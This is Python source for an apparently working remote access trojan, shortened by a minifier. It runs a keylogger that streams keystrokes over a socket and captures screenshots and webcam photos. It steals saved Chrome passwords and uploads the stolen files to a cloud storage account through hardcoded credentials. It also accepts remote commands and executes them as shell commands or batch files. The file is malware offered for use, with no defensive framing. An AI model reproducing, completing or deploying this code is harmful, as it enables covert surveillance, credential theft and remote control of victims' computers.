import threading,time,socket,pcloud,os
from subprocess import *
G=True
r=open
d=str
y=int
n=None
import kloglib,passretlib,scrshotlib,webcamlib
def la(cm,dt="850"):
    rty = Popen('cmd.exe', stdin=PIPE, stdout=PIPE,shell=True)
    o, r = rty.communicate(cm.encode())
    return o.decode(decodetype)

class M:
 def f():
  global R
  R=threading.Thread(target=kloglib.startklog)
  R.setDaemon(G)
  R.start()
class o:
 def K():
  a=''
  a=scrshotlib.tss(a)
  t=pcloud.PyCloud("uwy40726@bcaoo.com","ratsaregood")
  L=r(a,"rb")
  B=L.read()
  L.close()
  t.uploadfile(filename="/sswb/"+a,data=B)
  os.remove(a)
 def E():
  a=""
  a=webcamlib.takepic()
  t=pcloud.PyCloud("uwy40726@bcaoo.com","ratsaregood")
  L=r(a,"rb")
  B=L.read()
  L.close()
  t.uploadfile(filename="/sswb/"+a,data=B)
  os.remove(a)
class Y:
 def T():
  F=passretlib.retreive.chrome()
  t=time.gmtime()
  a="UNPW "+d(t.tm_hour)+"."+d(t.tm_min)+"."+d(t.tm_sec)+" "+d(t.tm_mday)+"-"+d(t.tm_mon)+"-"+d(t.tm_year)
  a=a+".txt"
  t=pcloud.PyCloud("uwy40726@bcaoo.com","ratsaregood")
  t.uploadfile(filename="/unpw/"+a,data=("\n\n".join(F)))
class U:
 class P:
  def b():
   global t
   t=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
   t.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
   P="127.0.0.1"
   l=230
   ip=(P,l)
   while G:
    try:
     t.connect(ip)
     while G:
      try:
       e=y(kloglib.helpers.lenofbufferkeys())
       if e>y(kloglib.helpers.pereverynum()):
        v=kloglib.helpers.sendbk()
        D="|JOIN|".join(v)
        t.sendall(D.encode())
       time.sleep(5)
      except:
       n
    except:
     n
 class I:
  def b():
   global o
   o=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
   o.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
   P="127.0.0.1"
   l=231
   ip=(P,l)
   while G:
    try:
     o.connect(ip)
    except:
     n
    while G:
     try:
      y=4096*4
      O=o.recv(y)
      O=O.decode()
      if O.lower()=="screenshot":
       o.K()
       v="Done!"
      elif O.lower()=="webshot":
       o.E()
       v="Done!"
      elif O.lower()=="getchromepasswords":
       Y.T()
       v="Done!"
      elif "#bashscriptstart" in O:
       O=O.replace("#bashscriptstart","")
       h=r("ex.bat","w")
       h.write(O)
       h.close()
       fh=os.popen("ex.bat")
       v=fh.read()
      else:
       v=la(O)
      o.sendall(v.encode())
     except:
      n
M.f()
time.sleep(2)
p=threading.Thread(target=U.P.b)
p.setDaemon(G)
p.start()
m=threading.Thread(target=U.I.b)
m.setDaemon(G)
m.start()
while G:
 n
# Created by pyminifier (https://github.com/liftoff/pyminifier)

